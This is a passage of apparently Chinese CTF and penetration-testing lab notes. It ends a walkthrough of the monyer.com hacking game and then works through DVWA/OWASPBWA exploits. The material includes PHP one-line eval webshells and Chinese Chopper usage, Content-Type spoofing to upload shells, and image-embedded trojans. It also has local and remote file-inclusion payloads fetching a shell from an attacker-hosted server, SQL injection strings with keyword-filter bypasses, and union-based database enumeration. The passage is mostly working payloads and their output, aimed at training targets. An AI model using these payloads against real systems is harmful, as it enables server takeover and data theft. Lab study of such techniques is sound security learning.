check(){if(document.getElementById('txt').value==a){window.location.href=a+\".php\"}else{alert(\"密码错误\")}}\n```\n\n在URL上跟上`3bhe.php`不行，再来看下第二段JS：\n\n```html\n<script type=\"text/javascript\">\n  eval(\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\");\n</script>\n-----------------------------------------------------\nconsole.log(\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\");\n-----------------------------------------------------\na=a.toUpperCase()+1;\n```\n\n toUpperCase() 方法用于把字符串转换为大写。 \n\n```javascript\nvar a=\"3bhe\"\nconsole.log(a.toUpperCase()+1)\n-----------------------------------------------------\n3BHE1\n```\n\nURL跟上`3BHE1.php`成功跳转到第5关\n\n5-http://monyer.com/game/game1/3BHE1.php\n\n```html\n<script type=\"text/javascript\">\n    function check(){\n        window.location.href = document.getElementById(\"txt\").value + \".php\";\n    }\n</script>\n```\n\n页面提示说藏在了页面里，就按F12到处找，看到消息头的响应头里这样一句话：`monyer: the password for the next level is asdf`；或者抓包在响应报文里也可以看到。\n\n6-http://monyer.com/game/game1/asdf.php\n\n```html\n<script type=\"text/javascript\">\n  function check(){\n\t  \twindow.location.href=document.getElementById('txt').value + \"7.php\";\n\t}\n</script>\n```\n\n在图片里找线索，主要是考信息搜索，从图片看出有magazine，用引号将从图片知道的内容包起来搜索，容易找到一家seventeen杂志。\n\n7-http://monyer.com/game/game1/seventeen7.php\n\n```html\n<script type=\"text/javascript\">\n  function check(){\n\t  \twindow.location.href=document.getElementById('txt').value + \".php\";\n\t}\n</script>\n```\n\n它给了几个提示，是关于社工的(感觉我什么都不能信了怎么办)\n\n> 提示1：这关需要简单的社会工程学，请联想本关特点进入下一关。\n>\n> 提示2：不要被你的所见、经验及习惯蒙蔽了你的双眼，看不到的正是你想要的。\n>\n> 提示3：与社会工程学相仿的是暴力破解，所以Monyer给你MD5：5e023995fb3f5e840ee684784f8f0799（小于10的数字+字母）\n\n它说联想本关，我就顺其自然地想到`eighteen8`但出现了Not Found，去解密了MD5发现也是`eighteen8`，我只能看看抓包能有什么效果，还是`eighteen8`，看它会不会有啥302跳转啥的，结果一抓发现Not Found是假的！我再回头看发现它的title就写着第8关，我因为看到Not Found就没注意到title。\n\n```html\n<html>\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">\n<meta name=\"robots\" content=\"noindex,nofollow\">\n<title>第8关</title>\n</head>\n<body>\n    <h1>Not Found</h1>\n    <p>The requested URL /eighteen8.php was not found on this server.</p>\n    <p>Additionally, a 404 Not Found\n        error was encountered while trying to use an ErrorDocument to handle the request.</p>\n    <p style=\"display:none\">\n    第8关\n\n    朋友您好，第8关欢迎您！\n    我对您的聪明才智感到惊讶！\n    相信我，现在世界上85%以上的人都在你之下，\n    所以你可以大步向前，义无反顾地进行你的事业了。\n    因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。\n\n\n    那么继续我们的约定，我将告诉你第9关的入口：\n\n    10000以内所有质数和.php\n    </p>\n</body>\n</html>\n```\n\n8-http://monyer.com/game/game1/eighteen8.php\n\n```python\n# -*- coding: utf-8 -*-\n#求10000以内的质数和，借大佬的代码一用\ndef zhishu(num=None):\n    if num is None or num == 1 or num < 0:\n        return 0\n\n    i = 2\n    while True:\n        if i == num:\n            return num\n        elif num % i != 0:\n            i += 1\n        elif num % i == 0 and num != i:\n            break\n\n    return 0\n\ndef sum_zhishu():\n    sum = 0\n    for i in range(10001):\n        sum += zhishu(i)\n    return sum\n\nprint(sum_zhishu())\n#5736396\n```\n\n直接在URL上改`5736396.php`\n\n9-http://monyer.com/game/game1/5736396.php\n\n认认真真看了美女许久一无所获，图片下载下来用notepad++打开发现最后有信息。\n\n> 那句广告词叫什么来着？\n> 对，“在这里，在这里，在这里......”\n> 恭喜你！\n> 第十关密码为：MonyerLikeYou_the10level\n> 从现在开始涉及到少许的动态东西，但你都可以按提示线索完成的！\n> 相信自己，没错的！\n\n10-https://www.monyer.com/game/game1/MonyerLikeYou_the10level.php\n\n>  当前用户身份为simpleuser 不是admin，无法显示下一关密码 \n\n抓包，改cookie中的username为admin，GET地址就是第10关的地址。\n\n页面跳转https://www.monyer.com/game/game1/admin.php\n\n>  好聪明哦！下一关密码为：doyouknow \n\n11-https://www.monyer.com/game/game1/doyouknow.php?action=show_login_false\n\n>  你的session不是passer，不能查看下一关密码 \n\nsession在哪找不到，我把URL的false改为true就可以通过了。\n\n>  您的session为passer，所以您可以查看下一关密码：smartboy \n\n12-https://www.monyer.com/game/game1/smartboy.php\n\n> JTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3\n\n有大小写、数字，猜测base64解码：\n\n> %4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77\n\nURL解码：\n\n> JTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw\n\nbase64解码：\n\n> %73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70\n\nURL解码：\n\n> sobeautiful.php\n\n```html\n<form action=\"?\" method=\"post\">\n        <input type=\"text\" name=\"pwd\" value=\"\">\n        <input type=\"submit\" value=\"提交\">\n    </form>\n```\n\n在以上源码中改为`action=\"sobeautiful.php\"`，再次点提交，进到13关。\n\n13-https://www.monyer.com/game/game1/sobeautiful.php\n\n>  本页禁止盗链！ \n\n顺便一说，如果直接在URL上改sobeautiful.php就会出现上面提示，进了第13关又没全进，反正就是做不了题。\n\n查看源码：\n\n```visual basic\ndim connect\nResponse.Expires=0 '系统数据库连接\nSet connect=Server.CreateObject(\"ADODB.Connection\")\nconnect.Open \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\" & server.MapPath(\"/Database.mdb\") & \";Mode=ReadWrite|Share Deny None;Persist Security Info=False\"\n\nset rss=server.createobject(\"adodb.recordset\")\nsqlstr=\"select password,pwd from [user] where pwd='\"&request(\"pwd\")&\"'\"\nrss.open sqlstr,connect,1,1\nif rss.bof and rss.eof then\n  response.write(\"密码错误\")\nelse\n  response.write(rss(\"password\"))\nend if\nrss.close\nset rss=nothing\nconnect.close\nset connect=nothing\n```\n\n可知我们填入的\"pwd\"放进select语句查询，可以试试SQL注入。\n\n试`' or 1=1`就试出来了密码：whatyouneverknow\n\n14-https://www.monyer.com/game/game1/whatyouneverknow.php\n\n下载下来是一个exe文件，打开要我们输入16位注册码。先把它放进IDA看看，只有一个函数，用ID5反编译不了，有可能是被加壳了。用查壳软件`exeinfope`看看，被加了upx壳。\n\n```\nupx -d crackme.exe //脱壳\n```\n\n脱壳后再放进IDA，好大的文件。。。试一下动态调试用OD，载入文件后右键->中文搜索引擎->智能搜索，在文本字符串中可以看到`ipasscrackme.asp`文件。\n\n```html\n<script type=\"text/javascript\">\n    function check(){\n        window.location.href = document.getElementById(\"txt\").value + \".php\";\n    }\n</script>\n```\n\n由于它后面规定了是以`.php`结尾，所以改为`ipasscrackme.php`\n\n15-http://monyer.com/game/game1/ipasscrackme.php \n\n> 你最终没能把cookies设为admin \n\n最后抓包将cookies设为admin就可以了。\n\n```\nCookie: username=admin; PHPSESSID=967sro4f61krddtkgkihm6jj68\n```\n\n","categories":["综合"],"tags":["CTF","Web"]},{"title":"Web渗透","url":"/posts/54924480.html","content":"\n文章知识点建立在OWASPBWA靶机与CTFHub实验的基础上。\n\n总实验准备：\n\nkali虚拟机、OWASPBWA靶机、win10、XShell\n\n<!--more-->\n\n# 1. 文件上传漏洞\n\n## 1.1 文件上传漏洞[低]\n\n```\n一句话木马，中国菜刀\n```\n\n靶机一定要用NAT连接，桥接方式不安全。因为用靶机复制不了不方便做笔记，所以我用XShell将靶机终端连接在物理机上。查看靶机的IP地址：\n\n```ubuntu\nroot@owaspbwa:~# dhclient eth0\nThere is already a pid file /var/run/dhclient.pid with pid 2890\nkilled old client process, removed PID file\nInternet Systems Consortium DHCP Client V3.1.3\nCopyright 2004-2009 Internet Systems Consortium.\nAll rights reserved.\nFor info, please visit https://www.isc.org/software/dhcp/\n\nListening on LPF/eth0/00:0c:29:40:b1:22\nSending on   LPF/eth0/00:0c:29:40:b1:22\nSending on   Socket/fallback\nDHCPREQUEST of 192.168.137.146 on eth0 to 255.255.255.255 port 67\nDHCPACK of 192.168.137.146 from 192.168.137.254\nbound to 192.168.137.146 -- renewal in 685 seconds.\n```\n\n在物理机输入靶机的IP地址**192.168.137.146**，在选项中找到Damn Vulnerable Web Application进入，用户名和密码均为admin。在左侧找到upload，可以试着选择文件上传，但文件大小不能过大，否则上传失败。在右下角处查看后端源码：\n\n```php\n<?php\n    if (isset($_POST['Upload'])) {\n\n            $target_path = DVWA_WEB_PAGE_TO_ROOT.\"hackable/uploads/\";\n            $target_path = $target_path . basename( $_FILES['uploaded']['name']);\n\n            if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {\n                \n                echo '<pre>';\n                echo 'Your image was not uploaded.';\n                echo '</pre>';\n                \n              } else {\n            \n                echo '<pre>';\n                echo $target_path . ' succesfully uploaded!';\n                echo '</pre>';\n                \n            }\n\n        }\n?>\n```\n\n源码告诉我们上传的文件没有限制是图片，并且它保存的路径在当前目录的/hackable/uploads上。我们将一句话木马shell1.php文件上传到系统中。\n\n```php\n<?php @eval($_POST['caidao']);?>\n```\n\n打开中国菜刀，右键添加地址：http://192.167.137.146/dvwa/hackable/uploads/shell1.php，后面小框填$_POST[]中的内容，即caidao。选中地址右键就可以开始搞事情了。\n\n在菜刀中添加地址的下面有个配置框，如果知道系统的数据库密码，还可以查看系统的数据库。\n\n```html\n<T>MYSQL</T>\n<H>loaclhost</H>\n<U>root</U>\n<P>owaspbwa</P>\n```\n\n## 1.2 文件上传漏洞[中]\n\n```\nBurpSuite，一句话木马，中国菜刀\n```\n\n在左侧DVWA Security可以选择安全性，这次选中级。\n\n查看一下后端源代码：\n\n```php\n<?php\n    if (isset($_POST['Upload'])) {\n\n            $target_path = DVWA_WEB_PAGE_TO_ROOT.\"hackable/uploads/\";\n            $target_path = $target_path . basename($_FILES['uploaded']['name']);\n            $uploaded_name = $_FILES['uploaded']['name'];\n            $uploaded_type = $_FILES['uploaded']['type'];\n            $uploaded_size = $_FILES['uploaded']['size'];\n\n            if (($uploaded_type == \"image/jpeg\") && ($uploaded_size < 100000)){\n\n\n                if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {\n                \n                    echo '<pre>';\n                    echo 'Your image was not uploaded.';\n                    echo '</pre>';\n                    \n                  } else {\n                \n                    echo '<pre>';\n                    echo $target_path . ' succesfully uploaded!';\n                    echo '</pre>';\n                    \n                    }\n            }\n            else{\n                echo '<pre>Your image was not uploaded.</pre>';\n            }\n        }\n?>\n```\n\n我们发现多添加了一个条件判断，上传mime类型是image/jpeg，即只能上传后缀为.jpg和.jpeg的文件，并且文件大小要小于100000b。直接上传一句话木马shell1.php肯定是不行的。\n\n先将之前放进uploads的所有文件删除：\n\n```\nroot@owaspbwa:~# cd /var/www/dvwa\nroot@owaspbwa:/var/www/dvwa# ls\nabout.php     docs         hackable          login.php    README.md     vulnerabilities\nCHANGELOG.md  dvwa         ids_log.php       logout.php   robots.txt\nconfig        external     index.php         phpinfo.php  security.php\nCOPYING.txt   favicon.ico  instructions.php  php.ini      setup.php\nroot@owaspbwa:/var/www/dvwa# cd hackable/uploads\nroot@owaspbwa:/var/www/dvwa/hackable/uploads# ls\ndvwa_email.png\tshell1.php\nroot@owaspbwa:/var/www/dvwa/hackable/uploads# rm -rf *\n```\n\n记住记住！！删除当前目录下所有文件的命令是**rm -rf ***，不是**rm -rf /***，这是删库跑路！！血的教训...\n\n所以我们要用到burpsuite，在火狐浏览器中设置为本地代理后，将发送一句话木马shell1.php的包进行拦截，将包中的Content-Type改为image/jpeg伪造成图片类型。\n\n```\nPOST /dvwa/vulnerabilities/upload/ HTTP/1.1\n\nHost: 192.168.137.146\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n\nAccept-Language: en-US,en;q=0.5\n\nAccept-Encoding: gzip, deflate\n\nContent-Type: multipart/form-data; boundary=---------------------------115689382727075237242790069120\n\nContent-Length: 509\n\nOrigin: http://192.168.137.146\n\nConnection: close\n\nReferer: http://192.168.137.146/dvwa/vulnerabilities/upload/\n\nCookie: security=medium; PHPSESSID=rdm26d89oh6rmfrfi1khqpkul7; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada\n\nUpgrade-Insecure-Requests: 1\n\n\n\n-----------------------------115689382727075237242790069120\n\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n\n\n100000\n\n-----------------------------115689382727075237242790069120\n\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"shell1.php\"\n\nContent-Type: application/x-php\t\t//改为image/jpeg\n\n\n\n<?php @eval($_POST['caidao']);?>\n\n\n-----------------------------115689382727075237242790069120\n\nContent-Disposition: form-data; name=\"Upload\"\n\n\n\nUpload\n\n-----------------------------115689382727075237242790069120--\n\n\n```\n\n再发送出去，系统以为我们发送的是图片类型，但实际我们发送的是一句话木马，再用中国菜刀就可以了。\n\n本来想用kali直接渗透，因为Kali本机就装有burp suite，所以很方便，但不会用kali的weevely——类似于中国菜刀的程序，故放弃。\n\n在物理机装好burpsuite，弄好代理，就跟上述操作一样。\n\n## 1.3 文件上传漏洞[高]\n\n查看后端源码：\n\n```php\n<?php\nif (isset($_POST['Upload'])) {\n\n            $target_path = DVWA_WEB_PAGE_TO_ROOT.\"hackable/uploads/\";\n            $target_path = $target_path . basename($_FILES['uploaded']['name']);\n            $uploaded_name = $_FILES['uploaded']['name'];\n            $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1);\n            $uploaded_size = $_FILES['uploaded']['size'];\n\n            if (($uploaded_ext == \"jpg\" || $uploaded_ext == \"JPG\" || $uploaded_ext == \"jpeg\" || $uploaded_ext == \"JPEG\") && ($uploaded_size < 100000)){\n\n\n                if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {\n                    \n                    echo '<pre>';\n                    echo 'Your image was not uploaded.';\n                    echo '</pre>';\n                \n                  } else {\n                \n                    echo '<pre>';\n                    echo $target_path . ' succesfully uploaded!';\n                    echo '</pre>';\n                    \n                    }\n            }\n            \n            else{\n                \n                echo '<pre>';\n                echo 'Your image was not uploaded.';\n                echo '</pre>';\n\n            }\n        }\n\n?> \n```\n\n这次的条件判断语句是直接检查文件的后缀，上面两种方法都不行。那我们只能是上传图片，如果图片中含有木马，那我们也可以用中国菜刀拿下这个系统。\n\n攻击方法要与文件包含漏洞[低]结合。\n\n## 1.4 一句话木马\n\n```php+HTML\nshell1.php\n<?php @eval($_POST['caidao']);?>\n\nshell2.php\n<?php eval($_REQUEST['cmd']);?>\t\nhttp://192.168.137.146/dvwa/hackable/uploads/shell2.php?cmd=system(\"pwd\");\n\nshell3.php\n<?php system($_REQUEST['chopper']);?>\nhttp://192.168.137.146/dvwa/hackable/uploads/shell3.php?chopper=ls /\n\nshell4.jpg\nshell4.php\n<?php fputs(fopen(\"shell4.php\",\"w\"), '<?php eval($_POST[caidao]);?>');?>\ncopy hello.jpg/b+shell4.php/a shell4.jpg\n\nshell5.phtml\n<script language='php'>@eval($_POST['caidao']);</script>\n<script language='php'>system('cat /flag');</script>\n\nshell6.php\n#加上图片文件头\n```\n\n## 1.5 weevly用法\n\n```\nweevly generate [password] [filename]\t生成一个木马文件\nweevly [url to file] [password]\t连接到服务器\n```\n\n## 1.6 .htaccess\n\n.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n\n构造.htaccess文件：\n\n```php+HTML\n<FilesMatch \"sj\">\n SetHandler application/x-httpd-php\n</FilesMatch>\n#FileMathch参数即为文件名的正则匹配，标签内的意思是将sj文件当成php文件解析\n```\n\n 构造sj文件：\n\n```php\n<?php passthru(\"ls /\"); ?>\n<?php passthru(\"ls /var/www/html\"); ?>\n<?php passthru(\"cat /var/www/html/flag.php\"); ?>\n<?php passthru(\"find / -name flag\"); ?>#这个不行\n```\n\n## 1.7 00截断\n\n在url中%00表示ascii码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。\n\n参考如下文章：https://writeup.ctfhub.com/Skill/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/gr98bRUp63TUwcHiaLZzEf.html\n\n\n\n# 2. 文件包含漏洞\n\n文件包含类似于C语言的include头文件，python的import文件，也类似于函数调用。\n\n## 2.1 本地文件包含(LFI)\n\nURL格式如下：\n\n```\nhttp://7ce7fcde-b026-4e63-a0f1-11442ec86169.node4.buuoj.cn:81/?file=hint.php?../../../../../ffffllllaaaagggg\n```\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=include.php\n\n#include.php和a.jpg与index.php在同一目录\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=a.jpg\t\t\n\n#/ect/passwd与index.php路径不同，也可以执行\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=/etc/passwd\t\n```\n\nURL中带参数，定位到服务器的某个目录某个文件中。\n\n```php\nWAF的问题：WAF不允许num传入字母，那我们可以在num前加个空格来绕过WAF\n/calc.php? num=print_r(scandir('/'));\t列出参数目录中的文件和目录，这里由于单引号和斜杠被过滤了，那就用chr()绕过，chr(47)就是斜杠/\n/calc.php? num=print_r(scandir(chr(47)));\n/calc.php? num=print_r(file_get_contents('/flagg'));\t读取flagg文件\n/calc.php? num=print_r(file_get_contents(chr(47).'flagg'));\t如果只绕过/，后面的引号又被过滤掉了，所以将所有字符都换成chr()\n这里/=chr(47)，f=chr(102),l=chr(49),a=chr(97),g=chr(103),g=chr(103)来进行绕过\n/calc.php? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));\t.表示连接\n```\n\n有时候下载下来的txt文件貌似找不到flag，但将txt文件放在URL中就可找到flag。\n\n```php\n读敏感文件\n?file=/etc/passwd\n\n利用封装协议读源代码,能看到php文件源码\n?file=php://filter/read=convert.base64-encode/resource=index.php\n\n包含图片Getshell\n在上传的图片中写入恶意代码，然后用本地文件包含调用，就会执行图片里的php代码\n\n包含日志文件Getshell\n路径\napache:/var/log/apache2/access.log\nnginx:/var/log/nginx/access.log\n\nsession文件包含Getshell\n?file=/var/log/nignx/access.log\n\n照片木马制作\ncopy 1.jpg/b + 1.php/a 2.jpg\n```\n\n## 2.2 远程文件包含(RFI)\n\nURL格式如下：\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=http://web_server/b.jpg\n```\n\nPHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为\"远程文件包含漏洞\"，远程文件包含更容易实现。\n\n`allow_url_fopen = On` 是否允许打开远程文件； `allow_url_include = On` 是否允许include/require远程文件。\n\n```\nhttp://challenge-d46d08980443a4ef.sandbox.ctfhub.com:10080/?file=http://你的服务器地址:8000/shell1.php\n```\n\n## 2.3 利用php://filter伪协议\n\n如果想要读取本地的PHP文件，可以用php://filter伪协议。\n\n当与包含函数结合时，php://filter流会被当作php文件执行。这时，如果我们不想让它执行，只是想查看源码，可以对其进行编码。\n\n```\nhttp://2be338a6-7ba2-453a-b873-4b4b7a4b4221.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n## 2.4 文件包含漏洞[低]\n\n结合文件上传漏洞[高]，我们用**本地文件包含**。思路是上传图片木马，即图片中包含生成木马的代码，如果系统有文件包含漏洞，就可以执行图片中的代码，生成木马。\n\n利用php://fileter伪协议进行文件包含。\n\n查看源码：\n\n```php\n<?php\n\n    $file = $_GET['page']; //The page we wish to display \n\n?> \n```\n\n$_GET函数表示参数会显示在地址栏上，默认地址为：\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/?page=include.php\n```\n\n准备一张小一点的图片hello.jpg，一个木马：\n\n```php\nshell4.php\n<?php fputs(fopen(\"shell4.php\",\"w\"), '<?php eval($_POST[caidao]);?>');?>\n```\n\n用cmd生成一个图片木马hi.jpg：\n\n```\ncopy hello.jpg/b + shell4.php/a hi.jpg\n```\n\n将图片放入winhex拉到最下面就可以看到木马已经放进图片中了。（或者用记事本打开图片也能看到）\n\n将图片上传后，去到文件包含漏洞页面，执行payload：\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=../../hackable/uploads/hi.jpg\n\n//dvwa文件上传访问的目录\n/var/www/dvwa/hackable/uploads\t\n\n//dvwa文件包含访问的目录\n/var/www/dvwa/vulnerabilities/fi\t\n```\n\n执行完后网页会出现一堆乱码，别管它，关键是会在/var/www/dvwa/vulnerabilities/fi目录下生成一个shell4.php文件，正是我们放进图片中的代码生成的一句话木马。\n\n写入菜刀地址：http://192.168.137.146/dvwa/vulnerabilities/fi/shell4.php和密码，成功渗透。\n\n**远程文件包含**\n\n```\nip a\t//查看IP地址：192.168.137.144\n```\n\n```php\n#将txt文件写进攻击机服务器的站点\nvim /var/www/html/chopper.txt\n<?php fputs(fopen(\"shell4.php\",\"w\"),'<?php eval($_POST[caidao]);?>');?>\n```\n\n可以打开http://192.168.137.144/chopper.txt试试，如果正常显示我们写进去的内容说明路径没错。\n\npayload：\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/?page=http://192.168.137.144/chopper.txt\n```\n\n执行后在/var/www/dvwa/vulnerabilities/fi目录下生成一个shell4.php文件，成功。\n\n## 2.2 文件包含漏洞[中]\n\n查看源码：\n\n```php\n<?php\n\n    $file = $_GET['page']; // The page we wish to display \n\n    // Bad input validation\n    $file = str_replace(\"http://\", \"\", $file);\n    $file = str_replace(\"https://\", \"\", $file);        \n\n?> \n```\n\n源码的意思是将参数中含有\"http://\"，\"https://\"替换成空，这时只要将限制字符串重写：\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/?page=httphttp://://192.168.137.144/chopper.txt\n\n把中间的http://替换成空，前后一合并就可以访问到远程服务器\n```\n\n第二种方法是用本地文件包含来做，同[低]。\n\n## 2.3 文件包含漏洞[高]\n\n查看源码：\n\n```php\n<?php\n        \n    $file = $_GET['page']; //The page we wish to display \n\n    // Only allow include.php\n    if ( $file != \"include.php\" ) {\n        echo \"ERROR: File not found!\";\n        exit;\n    }\n        \n?> \n```\n\n基本锁死了。\n\n**小知识**\n\nrobots.txt是爬虫的君子协议，说明哪些目录是不能爬的，一般直接在网址后面输入/robots.txt就可看到，但同时也有一点此地无银三百两的意思，说明这些目录很重要。\n\nCtrl + L清空终端界面\n\n# 3. SQL注入\n\n危害：\n\n1. 数据库信息泄漏：数据库中存放的用户的隐私信息的泄露\n2. 网页篡改：通过操作数据库对特定网页进行篡改\n3. 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被篡改\n4. 服务器被远程控制：被安装后门\n\nMySQL基础操作：\n\n```\nshow databases;\t\t\t\t\t查看数据库\nuse database_name;\t\t\t\t使用数据库\nshow tables;\t\t\t\t\t查看表\ndesc table_name;\t\t\t\t查看表结构\nselect * from table_name;\t\t查看表数据\ncreate database database_name;\t创建数据库\ndrop database database_name;\t删除数据库\n```\n\n常用变量：\n\n```\ndatabase()\t查看当前数据库名\tselect database();\nuser()\t\t查看当前用户\t\t select user();\nversion()\t查看版本\t\t   select version();\nshow variables like'%datadir%';\t\t查看安装路径\n```\n\n```\nunion select 1,2,database()\nunion select 1,2,group_concat(table_name) from information_sehema.tables where table_schema=database()\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_name='xxx'\nunion select 1,2,group_concat(column1_name,column2_name) from xxx\n```\n\n**information_schema库**\n\ninformation_schema是非常重要的库，是数据库字典，包含所有数据库的库信息，表信息。\n\n查询数据库名为dvwa的所有表：\n\n```mysql\nmysql> select TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='dvwa';\n+--------------+------------+\n| TABLE_SCHEMA | TABLE_NAME |\n+--------------+------------+\n| dvwa         | guestbook  |\n| dvwa         | users      |\n+--------------+------------+\n2 rows in set (0.08 sec)\n```\n\n查询数据库名为dvwa的users表的所有列：\n\n```mysql\nmysql> select COLUMN_NAME from information_schema.columns where TABLE_SCHEMA='dvwa' and TABLE_NAME='users';\n+-------------+\n| COLUMN_NAME |\n+-------------+\n| user_id     |\n| first_name  |\n| last_name   |\n| user        |\n| password    |\n| avatar      |\n+-------------+\n6 rows in set (0.03 sec)\n```\n\n## 3.1 错误注入\n\n### 3.1.1 SQL注入(低)\n\n输入'——单引号，就是要让页面报错，说明它能够接受单引号，有注入点。\n\n```\n1' or 1=1#\n1' union select 1#\n1' order by 4 -- d\n-1' union select 1,2,3 -- +\n-1 union select 1,database()\n```\n\n有时会将select,from,or,where等关键字过滤，可以将这些关键字进行重写：\n\n```\n' ununionion seleselectct 1,database(),group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'#\n\n' ununionion seleselectct 1,database(),group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'#\n\n' ununionion seleselectct 1,database(),group_concat(id,username,passwoorrd) frfromom b4bsql#\n```\n\n| 过滤关键字 | 绕过方法之一         | 绕过方法之二 | 绕过方法之三 |\n| ---------- | -------------------- | ------------ | ------------ |\n| select     | 重写                 | 大小写       | selec\\x74    |\n| or         | 重写                 | 大小写       | o\\x72        |\n| union      | 重写                 | 大小写       | unio\\x6e     |\n| 空格       | #、--、//、/**/、%00 | %2520        | '            |\n\n输入'——单引号，就是要让页面报错，说明它能够接受单引号，有注入点。\n\n查看源码：\n\n```php\n<?php    \n\nif(isset($_GET['Submit'])){\n    \n    // Retrieve data\n    \n    $id = $_GET['id'];\n\n    $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\";\n    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );\n\n    $num = mysql_numrows($result);\n\n    $i = 0;\n\n    while ($i < $num) {\n\n        $first = mysql_result($result,$i,\"first_name\");\n        $last = mysql_result($result,$i,\"last_name\");\n        \n        echo '<pre>';\n        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;\n        echo '</pre>';\n\n        $i++;\n    }\n}\n?>\n```\n\n在源码上可以看到我们输入的东西根据这条语句去查询：\n\n```php\n$getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\";\n```\n\n意思是将我们输入的ID的名字显示出来，但如果输入**' or 1=1 -- ddd**，整条语句变为\n\n```php\n$getid = \"SELECT first_name, last_name FROM users WHERE user_id = '' or 1=1 -- ddd '\";\n```\n\n输入的单引号与源码的单引号闭合，1=1永远为真，--是注释后面所有。1=1把所有元组显示出来：\n\n```\nID: ' or 1=1 -- ddd\nFirst name: admin\nSurname: admin\n\nID: ' or 1=1 -- ddd\nFirst name: Gordon\nSurname: Brown\n\nID: ' or 1=1 -- ddd\nFirst name: Hack\nSurname: Me\n\nID: ' or 1=1 -- ddd\nFirst name: Pablo\nSurname: Picasso\n\nID: ' or 1=1 -- ddd\nFirst name: Bob\nSurname: Smith\n\nID: ' or 1=1 -- ddd\nFirst name: user\nSurname: user\n```\n\n但这个只局限于这张表的first_name和last_name，再也查不出其它东西来，于是我们可以通过联合查询，查询其他列甚至其他表。\n\n在不知道源码的情况下，输入单引号页面报错，说明有注入漏洞。我们可以输入union试字段**' union select 1 -- d**，页面报错：\n\n```\nThe used SELECT statements have a different number of columns\n```\n\n试**' union select 1,2 -- d**，没报错，说明字段是2\n\n```\nID: ' union select 1,2 -- d\nFirst name: 1\nSurname: 2\n```\n\n试**' union select user(),database() -- d**，获得当前用户和当前数据库：\n\n```\nID: ' union select user(),database() -- d\nFirst name: dvwa@localhost\nSurname: dvwa\n```\n\n试**' union select table_schema,1 from information_schema.tables -- dd**，查询所有库名：\n\n```\nID: ' union select table_schema,1 from information_schema.tables -- dd\nFirst name: information_schema\nSurname: 1\n\nID: ' union select table_schema,1 from information_schema.tables -- dd\nFirst name: dvwa\nSurname: 1\n```\n\n网页只显示了两个库，因为这个用户的权限只能看到这两个库。\n\n试**' union select table_schema,table_name from information_schema.tables where table_schema='dvwa' -- dd**，查询dvwa库的所有表：\n\n```\nID: ' union select table_schema,table_name from information_schema.tables where table_schema='dvwa' -- dd\nFirst name: dvwa\nSurname: guestbook\n\nID: ' union select table_schema,table_name from information_schema.tables where table_schema='dvwa' -- dd\nFirst name: dvwa\nSurname: users\n```\n\n试**' union select 1,column_name from information_schema.columns where table_name='users' -- dd**，查询users表中的列：\n\n```\nID: ' union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: user_id\n\nID: ' union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: first_name\n\nID: ' 